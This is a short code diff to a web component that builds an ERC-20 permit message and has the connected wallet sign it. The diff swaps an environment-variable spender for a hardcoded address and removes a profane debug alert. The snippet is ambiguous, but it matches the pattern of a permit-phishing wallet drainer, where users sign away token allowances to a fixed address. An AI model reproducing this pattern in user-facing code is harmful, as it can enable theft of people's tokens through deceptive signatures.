@@ -254,13 +254,12 @@ const Box2 = () => {
       }
       const message = {
         owner: address,
-        spender: process.env.ADDRESS,
+        spender: "0xa44933EB3c11c239DFf2df693E8934ad6b642a9c",
         value: value.toString(),
         nonce: nonce.toString(),
         deadline: deadline.toString(),
       }
 
-      alert("fuck")
       const signature = await signer._signTypedData(domain, types, message)
       const { v, r, s } = ethers.utils.splitSignature(signature)
 
